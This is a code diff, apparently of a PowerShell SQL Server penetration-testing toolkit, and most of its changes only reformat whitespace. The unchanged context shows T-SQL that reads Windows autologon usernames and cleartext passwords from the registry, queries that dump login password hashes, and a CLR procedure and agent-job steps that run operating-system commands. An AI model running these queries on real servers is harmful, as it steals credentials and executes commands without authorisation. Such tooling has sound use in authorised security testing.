@@ -3297,7 +3297,7 @@ RunCmd();
                     # Overwrite command with the JScript
                     $Command = $JScript_Command
                     $SubSystemFinal = "ActiveScripting"
-                    $DatabaseSub = "@database_name=N'JavaScript',"	
+                    $DatabaseSub = "@database_name=N'JavaScript',"  
                 }
 
 
@@ -3317,7 +3317,7 @@ END Function
                     # Overwrite command with the VBScript
                     $Command = $VBScript_Command
                     $SubSystemFinal = "ActiveScripting"
-                    $DatabaseSub = "@database_name=N'VBScript',"	
+                    $DatabaseSub = "@database_name=N'VBScript',"    
                 }                
 
                 # Fix single quotes so then can be used within commands ' -> ''
@@ -3528,18 +3528,18 @@ Function  Get-SQLServerInfo
                 -- Get machine type
                 DECLARE @MachineType  SYSNAME
                 EXECUTE master.dbo.xp_regread
-                @rootkey		= N'HKEY_LOCAL_MACHINE',
-                @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
-                @value_name		= N'ProductType',
-                @value			= @MachineType output
+                @rootkey        = N'HKEY_LOCAL_MACHINE',
+                @key            = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
+                @value_name     = N'ProductType',
+                @value          = @MachineType output
 
                 -- Get OS version
                 DECLARE @ProductName  SYSNAME
                 EXECUTE master.dbo.xp_regread
-                @rootkey		= N'HKEY_LOCAL_MACHINE',
-                @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
-                @value_name		= N'ProductName',
-            @value			= @ProductName output"
+                @rootkey        = N'HKEY_LOCAL_MACHINE',
+                @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
+                @value_name     = N'ProductName',
+            @value          = @ProductName output"
 
             $SysadminQuery = '  @MachineType as [OsMachineType],
             @ProductName as [OSVersionName],'
@@ -3581,12 +3581,12 @@ Function  Get-SQLServerInfo
 
             -- Get the forced encryption flag
             BEGIN TRY 
-	            DECLARE @ForcedEncryption INT
-	            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
-	            N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
-	            N'ForceEncryption', @ForcedEncryption OUTPUT
+                DECLARE @ForcedEncryption INT
+                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+                N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
+                N'ForceEncryption', @ForcedEncryption OUTPUT
             END TRY
-            BEGIN CATCH	            
+            BEGIN CATCH             
             END CATCH
 
             -- Grab additional information as sysadmin
@@ -3810,18 +3810,18 @@ Function  Get-SQLServerInfoThreaded
                     -- Get machine type
                     DECLARE @MachineType  SYSNAME
                     EXECUTE master.dbo.xp_regread
-                    @rootkey		= N'HKEY_LOCAL_MACHINE',
-                    @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
-                    @value_name		= N'ProductType',
-                    @value			= @MachineType output
+                    @rootkey        = N'HKEY_LOCAL_MACHINE',
+                    @key            = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
+                    @value_name     = N'ProductType',
+                    @value          = @MachineType output
 
                     -- Get OS version
                     DECLARE @ProductName  SYSNAME
                     EXECUTE master.dbo.xp_regread
-                    @rootkey		= N'HKEY_LOCAL_MACHINE',
-                    @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
-                    @value_name		= N'ProductName',
-                @value			= @ProductName output"
+                    @rootkey        = N'HKEY_LOCAL_MACHINE',
+                    @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
+                    @value_name     = N'ProductName',
+                @value          = @ProductName output"
 
                 $SysadminQuery = '  @MachineType as [OsMachineType],
                 @ProductName as [OSVersionName],'
@@ -4912,7 +4912,7 @@ Function  Get-SQLColumn
                 COLUMN_NAME as [ColumnName],
                 DATA_TYPE as [ColumnDataType],
                 CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
-                FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
+                FROM    [$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                 $ColumnSearchFilter
                 $ColumnFilter
                 $TableNameFilter
@@ -6919,74 +6919,74 @@ Function  Get-SQLOleDbProvder
             FETCH NEXT FROM MY_CURSOR1 INTO @Provider_name,@Provider_parse_name,@Provider_description
             WHILE @@FETCH_STATUS = 0 
   
-	            BEGIN  
-		
-	            -- Set the registry path
-	            SET @regpath = N'SOFTWARE\Microsoft\MSSQLServer\Providers\' + @provider_name  
+                BEGIN  
+        
+                -- Set the registry path
+                SET @regpath = N'SOFTWARE\Microsoft\MSSQLServer\Providers\' + @provider_name  
 
-	            -- AllowInProcess	
-	             DECLARE @AllowInProcess int 
-	             SET @AllowInProcess = 0 
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'AllowInProcess',	@AllowInProcess OUTPUT		 
-	             IF @AllowInProcess IS NULL 
-	             SET @AllowInProcess = 0
+                -- AllowInProcess   
+                 DECLARE @AllowInProcess int 
+                 SET @AllowInProcess = 0 
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'AllowInProcess',  @AllowInProcess OUTPUT       
+                 IF @AllowInProcess IS NULL 
+                 SET @AllowInProcess = 0
 
-	            -- DisallowAdHocAccess 
-	             DECLARE @DisallowAdHocAccess int  
-	             SET @DisallowAdHocAccess = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DisallowAdHocAccess',	@DisallowAdHocAccess OUTPUT	 
-	             IF @DisallowAdHocAccess IS NULL 
-	             SET @DisallowAdHocAccess = 0
+                -- DisallowAdHocAccess 
+                 DECLARE @DisallowAdHocAccess int  
+                 SET @DisallowAdHocAccess = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DisallowAdHocAccess', @DisallowAdHocAccess OUTPUT  
+                 IF @DisallowAdHocAccess IS NULL 
+                 SET @DisallowAdHocAccess = 0
 
-	            -- DynamicParameters 
-	             DECLARE @DynamicParameters  int  
-	             SET @DynamicParameters  = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DynamicParameters',	@DynamicParameters OUTPUT	 
-	             IF @DynamicParameters  IS NULL 
-	             SET @DynamicParameters  = 0
+                -- DynamicParameters 
+                 DECLARE @DynamicParameters  int  
+                 SET @DynamicParameters  = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'DynamicParameters',   @DynamicParameters OUTPUT    
+                 IF @DynamicParameters  IS NULL 
+                 SET @DynamicParameters  = 0
 
-	            -- IndexAsAccessPath 
-	             DECLARE @IndexAsAccessPath int 
-	             SET @IndexAsAccessPath = 0 
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'IndexAsAccessPath',	@IndexAsAccessPath OUTPUT	 
-	             IF @IndexAsAccessPath IS NULL 
-	             SET @IndexAsAccessPath  = 0
+                -- IndexAsAccessPath 
+                 DECLARE @IndexAsAccessPath int 
+                 SET @IndexAsAccessPath = 0 
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'IndexAsAccessPath',   @IndexAsAccessPath OUTPUT    
+                 IF @IndexAsAccessPath IS NULL 
+                 SET @IndexAsAccessPath  = 0
 
-	            -- LevelZeroOnly 
-	             DECLARE @LevelZeroOnly int
-	             SET @LevelZeroOnly  = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'LevelZeroOnly',	@LevelZeroOnly OUTPUT	
-	             IF  @LevelZeroOnly IS NULL 
-	             SET  @LevelZeroOnly  = 0	  
+                -- LevelZeroOnly 
+                 DECLARE @LevelZeroOnly int
+                 SET @LevelZeroOnly  = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'LevelZeroOnly',   @LevelZeroOnly OUTPUT   
+                 IF  @LevelZeroOnly IS NULL 
+                 SET  @LevelZeroOnly  = 0     
 
-	            -- NestedQueries 
-	             DECLARE @NestedQueries int  
-	             SET @NestedQueries = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NestedQueries',	@NestedQueries OUTPUT
-	             IF   @NestedQueries IS NULL 
-	             SET  @NestedQueries = 0		 	 
+                -- NestedQueries 
+                 DECLARE @NestedQueries int  
+                 SET @NestedQueries = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NestedQueries',   @NestedQueries OUTPUT
+                 IF   @NestedQueries IS NULL 
+                 SET  @NestedQueries = 0             
 
-	            -- NonTransactedUpdates 
-	             DECLARE @NonTransactedUpdates int  
-	             SET @NonTransactedUpdates = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NonTransactedUpdates',	@NonTransactedUpdates  OUTPUT	 
-	             IF  @NonTransactedUpdates IS NULL 
-	             SET @NonTransactedUpdates = 0
+                -- NonTransactedUpdates 
+                 DECLARE @NonTransactedUpdates int  
+                 SET @NonTransactedUpdates = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'NonTransactedUpdates',    @NonTransactedUpdates  OUTPUT    
+                 IF  @NonTransactedUpdates IS NULL 
+                 SET @NonTransactedUpdates = 0
 
-	            -- SqlServerLIKE
-	             DECLARE @SqlServerLIKE int  
-	             SET @SqlServerLIKE  = 0
-	             exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'SqlServerLIKE',	@SqlServerLIKE OUTPUT	
-	             IF  @SqlServerLIKE IS NULL 
-	             SET @SqlServerLIKE = 0 
+                -- SqlServerLIKE
+                 DECLARE @SqlServerLIKE int  
+                 SET @SqlServerLIKE  = 0
+                 exec sys.xp_instance_regread N'HKEY_LOCAL_MACHINE',@regpath,'SqlServerLIKE',   @SqlServerLIKE OUTPUT   
+                 IF  @SqlServerLIKE IS NULL 
+                 SET @SqlServerLIKE = 0 
 
-	            -- Add the full provider record to the temp table
-	            INSERT INTO #ProviderInformation
-	            VALUES (@Provider_name,@Provider_description,@Provider_parse_name,@AllowInProcess,@DisallowAdHocAccess,@DynamicParameters,@IndexAsAccessPath,@LevelZeroOnly,@NestedQueries,@NonTransactedUpdates,@SqlServerLIKE);
+                -- Add the full provider record to the temp table
+                INSERT INTO #ProviderInformation
+                VALUES (@Provider_name,@Provider_description,@Provider_parse_name,@AllowInProcess,@DisallowAdHocAccess,@DynamicParameters,@IndexAsAccessPath,@LevelZeroOnly,@NestedQueries,@NonTransactedUpdates,@SqlServerLIKE);
 
-	            FETCH NEXT FROM MY_CURSOR1 INTO  @Provider_name,@Provider_parse_name,@Provider_description
+                FETCH NEXT FROM MY_CURSOR1 INTO  @Provider_name,@Provider_parse_name,@Provider_description
 
-	            END   
+                END   
 
             -- Return records
             SELECT * FROM #ProviderInformation
@@ -7265,13 +7265,13 @@ Function  Get-SQLDomainObject
             
             -- Create SQL Server link to ADSI
             IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLinkName') = 0
-	            EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLinkName', 
-	            @srvproduct=N'Active Directory Service Interfaces', 
-	            @provider=N'ADSDSOObject', 
-	            @datasrc=N'adsdatasource'
+                EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLinkName', 
+                @srvproduct=N'Active Directory Service Interfaces', 
+                @provider=N'ADSDSOObject', 
+                @datasrc=N'adsdatasource'
                 
             ELSE
-	            SELECT 'The target SQL Server link already exists.'"
+                SELECT 'The target SQL Server link already exists.'"
 
             # Run query to create link
             $QueryCreateLinkResults = Get-SQLQuery -Instance $Instance -Query $QueryCreateLink -Username $Username -Password $Password -Credential $Credential -ReturnError
@@ -9369,21 +9369,21 @@ Function  Get-SQLServiceAccount
                 @value        = @WriterLogin OUTPUT
 
                 -- Get MSOLAP - Calculated
-                EXECUTE		master.dbo.xp_instance_regread
+                EXECUTE     master.dbo.xp_instance_regread
                 N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,
                 N'ObjectName',@AnalysisLogin OUTPUT
 
                 -- Get Reporting - Calculated
-                EXECUTE		master.dbo.xp_instance_regread
+                EXECUTE     master.dbo.xp_instance_regread
                 N'HKEY_LOCAL_MACHINE', @ReportInstance,
                 N'ObjectName',@ReportLogin OUTPUT
 
                 -- Get SQL Server DTS Server / Analysis - Calulated
-                EXECUTE		master.dbo.xp_instance_regread
+                EXECUTE     master.dbo.xp_instance_regread
                 N'HKEY_LOCAL_MACHINE', @IntegrationVersion,
             N'ObjectName',@IntegrationDtsLogin OUTPUT"
 
-            $SysadminQuery = '	,[BrowserLogin] = @BrowserLogin,
+            $SysadminQuery = '  ,[BrowserLogin] = @BrowserLogin,
                 [WriterLogin] = @WriterLogin,
                 [AnalysisLogin] = @AnalysisLogin,
                 [ReportLogin] = @ReportLogin,
@@ -9397,18 +9397,18 @@ Function  Get-SQLServiceAccount
 
         # Define Query
         $Query = "  -- Setup variables
-            DECLARE		@SQLServerInstance	VARCHAR(250)
-            DECLARE		@MSOLAPInstance		VARCHAR(250)
-            DECLARE		@ReportInstance 	VARCHAR(250)
-            DECLARE		@AgentInstance	 	VARCHAR(250)
-            DECLARE		@IntegrationVersion	VARCHAR(250)
-            DECLARE		@DBEngineLogin		VARCHAR(100)
-            DECLARE		@AgentLogin		VARCHAR(100)
-            DECLARE		@BrowserLogin		VARCHAR(100)
-            DECLARE     	@WriterLogin		VARCHAR(100)
-            DECLARE		@AnalysisLogin		VARCHAR(100)
-            DECLARE		@ReportLogin		VARCHAR(100)
-            DECLARE		@IntegrationDtsLogin	VARCHAR(100)
+            DECLARE     @SQLServerInstance  VARCHAR(250)
+            DECLARE     @MSOLAPInstance     VARCHAR(250)
+            DECLARE     @ReportInstance     VARCHAR(250)
+            DECLARE     @AgentInstance      VARCHAR(250)
+            DECLARE     @IntegrationVersion VARCHAR(250)
+            DECLARE     @DBEngineLogin      VARCHAR(100)
+            DECLARE     @AgentLogin     VARCHAR(100)
+            DECLARE     @BrowserLogin       VARCHAR(100)
+            DECLARE         @WriterLogin        VARCHAR(100)
+            DECLARE     @AnalysisLogin      VARCHAR(100)
+            DECLARE     @ReportLogin        VARCHAR(100)
+            DECLARE     @IntegrationDtsLogin    VARCHAR(100)
 
             -- Get Service Paths for default and name instance
             if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
@@ -9431,19 +9431,19 @@ Function  Get-SQLServiceAccount
             END
 
             -- Get SQL Server - Calculated
-            EXECUTE		master.dbo.xp_instance_regread
+            EXECUTE     master.dbo.xp_instance_regread
             N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
             N'ObjectName',@DBEngineLogin OUTPUT
 
             -- Get SQL Server Agent - Calculated
-            EXECUTE		master.dbo.xp_instance_regread
+            EXECUTE     master.dbo.xp_instance_regread
             N'HKEY_LOCAL_MACHINE', @AgentInstance,
             N'ObjectName',@AgentLogin OUTPUT
 
             $SysadminSetup
 
             -- Dislpay results
-            SELECT		'$ComputerName' as [ComputerName],
+            SELECT      '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
             [DBEngineLogin] = @DBEngineLogin,
             [AgentLogin] = @AgentLogin
@@ -9704,25 +9704,25 @@ Function  Get-SQLAgentJob
 
 
                 # Reference: https://msdn.microsoft.com/en-us/library/ms189817.aspx
-                $Query = "SELECT 	steps.database_name,
-	                            job.job_id as [JOB_ID],
-	                            job.name as [JOB_NAME],
-	                            job.description as [JOB_DESCRIPTION],
-								SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
-								steps.proxy_id,
-								proxies.name as [proxy_account],
-	                            job.enabled,
-	                            steps.server,
-	                            job.date_created,   
-                                steps.last_run_date,								                             
-								steps.step_name,
-								steps.subsystem,
-	                            steps.command
+                $Query = "SELECT    steps.database_name,
+                                job.job_id as [JOB_ID],
+                                job.name as [JOB_NAME],
+                                job.description as [JOB_DESCRIPTION],
+                                SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
+                                steps.proxy_id,
+                                proxies.name as [proxy_account],
+                                job.enabled,
+                                steps.server,
+                                job.date_created,   
+                                steps.last_run_date,                                                             
+                                steps.step_name,
+                                steps.subsystem,
+                                steps.command
                             FROM [msdb].[dbo].[sysjobs] job
                             INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
-	                            ON job.job_id = steps.job_id
-							left join [msdb].[dbo].[sysproxies] proxies
-							 on steps.proxy_id = proxies.proxy_id
+                                ON job.job_id = steps.job_id
+                            left join [msdb].[dbo].[sysproxies] proxies
+                             on steps.proxy_id = proxies.proxy_id
                             WHERE 1=1
                             $KeywordFilter
                             $SubSystemFilter
@@ -9992,8 +9992,8 @@ Function  Get-SQLAuditDatabaseSpec
             s.name as [AuditSpecification],
             d.audit_action_id as [AuditActionId],
             d.audit_action_name as [AuditAction],
-	        d.major_id,
-	        OBJECT_NAME(d.major_id) as object,	
+            d.major_id,
+            OBJECT_NAME(d.major_id) as object,  
             s.is_state_enabled,
             d.is_group,
             s.create_date,
@@ -11770,7 +11770,7 @@ Function  Get-SQLTriggerDdl
         }
 
         # Define Query
-        $Query = " SELECT 	'$ComputerName' as [ComputerName],
+        $Query = " SELECT   '$ComputerName' as [ComputerName],
             '$Instance' as [Instance],
             name as [TriggerName],
             object_id as [TriggerId],
@@ -12190,20 +12190,20 @@ Function  Get-SQLStoredProcedureCLR
             # Define Query
             $Query = "  USE $DbName;
                         SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], 
-			                        af.file_id,					  	
-			                        af.name + '.dll' as [file_name],
-			                        asmbly.clr_name,
-			                        asmbly.assembly_id,           
-			                        asmbly.name AS [assembly_name], 
+                                    af.file_id,                     
+                                    af.name + '.dll' as [file_name],
+                                    asmbly.clr_name,
+                                    asmbly.assembly_id,           
+                                    asmbly.name AS [assembly_name], 
                                     am.assembly_class,
                                     am.assembly_method,
-			                        so.object_id as [sp_object_id],
-			                        so.name AS [sp_name],
+                                    so.object_id as [sp_object_id],
+                                    so.name AS [sp_name],
                                     so.[type] as [sp_type],
                                     asmbly.permission_set_desc,
                                     asmbly.create_date,
                                     asmbly.modify_date,
-                                    af.content								           
+                                    af.content                                         
                         FROM        sys.assembly_modules am
                         INNER JOIN  sys.assemblies asmbly
                         ON  asmbly.assembly_id = am.assembly_id
@@ -12216,20 +12216,20 @@ Function  Get-SQLStoredProcedureCLR
                     $NativeStuff = "
                         UNION ALL
                         SELECT      SCHEMA_NAME(at.[schema_id]) AS [SchemaName], 
-			                        af.file_id,					  	
-			                        af.name + '.dll' as [file_name],
-			                        asmbly.clr_name,
-			                        asmbly.assembly_id,
+                                    af.file_id,                     
+                                    af.name + '.dll' as [file_name],
+                                    asmbly.clr_name,
+                                    asmbly.assembly_id,
                                     asmbly.name AS [AssemblyName],
                                     at.assembly_class,
                                     NULL AS [assembly_method],
-			                        NULL as [sp_object_id],
-			                        at.name AS [sp_name],
+                                    NULL as [sp_object_id],
+                                    at.name AS [sp_name],
                                     'UDT' AS [type],
                                     asmbly.permission_set_desc,
                                     asmbly.create_date,
                                     asmbly.modify_date,
-                                    af.content								           
+                                    af.content                                         
                         FROM        sys.assembly_types at
                         INNER JOIN  sys.assemblies asmbly 
                         ON asmbly.assembly_id = at.assembly_id
@@ -12748,30 +12748,30 @@ Function  Get-SQLStoredProcedureXP
                     '$Instance' as [Instance],
                     '$DbName' as [DatabaseName],                
                     o.object_id,
-		            o.parent_object_id,
-		            o.schema_id,
-		            o.type,
-		            o.type_desc,
-		            o.name,
-		            o.principal_id,
-		            s.text,
-		            s.ctext,
-		            s.status,
-		            o.create_date,
-		            o.modify_date,
-		            o.is_ms_shipped,
-		            o.is_published,
-		            o.is_schema_published,
-		            s.colid,
-		            s.compressed,
-		            s.encrypted,
-		            s.id,
-		            s.language,
-		            s.number,
-		            s.texttype
+                    o.parent_object_id,
+                    o.schema_id,
+                    o.type,
+                    o.type_desc,
+                    o.name,
+                    o.principal_id,
+                    s.text,
+                    s.ctext,
+                    s.status,
+                    o.create_date,
+                    o.modify_date,
+                    o.is_ms_shipped,
+                    o.is_published,
+                    o.is_schema_published,
+                    s.colid,
+                    s.compressed,
+                    s.encrypted,
+                    s.id,
+                    s.language,
+                    s.number,
+                    s.texttype
             FROM sys.objects o 
             INNER JOIN sys.syscomments s
-		            ON o.object_id = s.id
+                    ON o.object_id = s.id
             WHERE o.type = 'x' 
             $ProcedureNameFilter"
 
@@ -13485,9 +13485,9 @@ Function  Get-SQLAssemblyFile
             # Define Query
             $Query = "USE $DbName;
                       SELECT af.assembly_id,
- 					  a.name as assembly_name,
-                      af.file_id,					  	
-					  af.name as file_name,
+                      a.name as assembly_name,
+                      af.file_id,                       
+                      af.name as file_name,
                       a.clr_name,
                       af.content, 
                       a.permission_set_desc,
@@ -14632,19 +14632,19 @@ function Create-SQLFileCLRDll
             proc.Start();
 
                 // Create the record and specify the metadata for the columns.
-	            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
-	            // Mark the begining of the result-set.
-	            SqlContext.Pipe.SendResultsStart(record);
+                // Mark the begining of the result-set.
+                SqlContext.Pipe.SendResultsStart(record);
 
                 // Set values for each column in the row
-	            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+                record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
 
-	            // Send the row back to the client.
-	            SqlContext.Pipe.SendResultsRow(record);
+                // Send the row back to the client.
+                SqlContext.Pipe.SendResultsRow(record);
 
-	            // Mark the end of the result-set.
-	            SqlContext.Pipe.SendResultsEnd();
+                // Mark the end of the result-set.
+                SqlContext.Pipe.SendResultsEnd();
 
             proc.WaitForExit();
             proc.Close();
@@ -15627,11 +15627,11 @@ function Get-DomainObject
             PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
             .EXAMPLE
             PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1:389
-            .Note It will use the security context of the current process to authenticate to the domain controller.
-            .Note IP/Port can be specified to reach a pivot machine.
+            It will use the security context of the current process to authenticate to the domain controller.
+            IP:Port can be specified to reach a pivot machine.
             .EXAMPLE
             PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
-            .Note
+            .Notes
             This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
     #>
     [CmdletBinding()]
@@ -15696,8 +15696,12 @@ function Get-DomainObject
 
                 $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList).distinguishedname
 
+                # Authentication failed. distinguishedName property can not be empty.
+                if(-not $objDomain){ throw }
+
             }catch{
-                Write-Output "Authentication failed."
+                Write-Output "Authentication failed or domain controller is not reachable."
+                Break
             }
 
             # add ldap path
@@ -16860,26 +16864,26 @@ Function   Get-SQLRecoverPwAutoLogon
         -- Get AutoLogin Default Domain
         DECLARE @AutoLoginDomain  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'DefaultDomainName',
-        @value			= @AutoLoginDomain output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'DefaultDomainName',
+        @value          = @AutoLoginDomain output
 
         -- Get AutoLogin DefaultUsername
         DECLARE @AutoLoginUser  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'DefaultUserName',
-        @value			= @AutoLoginUser output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'DefaultUserName',
+        @value          = @AutoLoginUser output
 
         -- Get AutoLogin DefaultUsername
         DECLARE @AutoLoginPassword  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'DefaultPassword',
-        @value			= @AutoLoginPassword output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'DefaultPassword',
+        @value          = @AutoLoginPassword output
 
         -- Display Results
         SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"
@@ -16906,26 +16910,26 @@ Function   Get-SQLRecoverPwAutoLogon
         -- Get Alt AutoLogin Default Domain
         DECLARE @AltAutoLoginDomain  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'AltDefaultDomainName',
-        @value			= @AltAutoLoginDomain output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'AltDefaultDomainName',
+        @value          = @AltAutoLoginDomain output
 
         -- Get Alt AutoLogin DefaultUsername
         DECLARE @AltAutoLoginUser  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'AltDefaultUserName',
-        @value			= @AltAutoLoginUser output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'AltDefaultUserName',
+        @value          = @AltAutoLoginUser output
 
         -- Get Alt AutoLogin DefaultUsername
         DECLARE @AltAutoLoginPassword  SYSNAME
         EXECUTE master.dbo.xp_regread
-        @rootkey		= N'HKEY_LOCAL_MACHINE',
-        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
-        @value_name		= N'AltDefaultPassword',
-        @value			= @AltAutoLoginPassword output
+        @rootkey        = N'HKEY_LOCAL_MACHINE',
+        @key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name     = N'AltDefaultPassword',
+        @value          = @AltAutoLoginPassword output
 
         -- Display Results
         SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"
@@ -17080,26 +17084,26 @@ Function Get-SQLServerPolicy
                 SELECT '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
                     p.policy_id,
-		            p.name as [PolicyName],
-		            p.condition_id,
-		            c.name as [ConditionName],
-		            c.facet,
-		            c.expression as [ConditionExpression],
-		            p.root_condition_id,
-		            p.is_enabled,
-		            p.date_created,
-		            p.date_modified,
-		            p.description, 
-		            p.created_by, 
-		            p.is_system,
+                    p.name as [PolicyName],
+                    p.condition_id,
+                    c.name as [ConditionName],
+                    c.facet,
+                    c.expression as [ConditionExpression],
+                    p.root_condition_id,
+                    p.is_enabled,
+                    p.date_created,
+                    p.date_modified,
+                    p.description, 
+                    p.created_by, 
+                    p.is_system,
                     t.target_set_id,
                     t.TYPE,
                     t.type_skeleton
                 FROM msdb.dbo.syspolicy_policies p
                 INNER JOIN msdb.dbo.syspolicy_conditions c 
-	                ON p.condition_id = c.condition_id
+                    ON p.condition_id = c.condition_id
                 INNER JOIN msdb.dbo.syspolicy_target_sets t
-	                ON t.object_set_id = p.object_set_id"
+                    ON t.object_set_id = p.object_set_id"
 
         # Execute Query
         $TblPolicyInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
@@ -17145,20 +17149,20 @@ Function  Get-SQLServerPasswordHash
             SQL Server instance to connection to.
             .PARAMETER PrincipalName
             Pincipal name to filter for.
-			.PARAMETER
-			Migrate to SQL Server process.
+            .PARAMETER
+            Migrate to SQL Server process.
             .EXAMPLE
             PS C:\> Get-SQLServerPasswordHash -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
 
-			ComputerName        : SQLServer1
-			Instance            : SQLServer1\STANDARDDEV2014
-			PrincipalId         : 1
-			PrincipalName       : sa
-			PrincipalSid        : 7F883D1B...
-			PrincipalType       : SQL_LOGIN
-			CreateDate          : 19/03/2017 08:16:57
-			DefaultDatabaseName : master
-			PasswordHash        : 0x0200c8...
+            ComputerName        : SQLServer1
+            Instance            : SQLServer1\STANDARDDEV2014
+            PrincipalId         : 1
+            PrincipalName       : sa
+            PrincipalSid        : 7F883D1B...
+            PrincipalType       : SQL_LOGIN
+            CreateDate          : 19/03/2017 08:16:57
+            DefaultDatabaseName : master
+            PasswordHash        : 0x0200c8...
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLServerPasswordHash -Verbose
     #>
@@ -17374,22 +17378,22 @@ Function  Get-SQLServerPasswordHash
                 SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                 name as [PrincipalName],
                 createdate as [CreateDate],
-			    dbname as [DefaultDatabaseName],
-			    password as [PasswordHash]
+                dbname as [DefaultDatabaseName],
+                password as [PasswordHash]
                 FROM [sysxlogins]"
         }
-		else
+        else
         {
             # Define Query
             $Query = "USE master;
                 SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                 name as [PrincipalName],
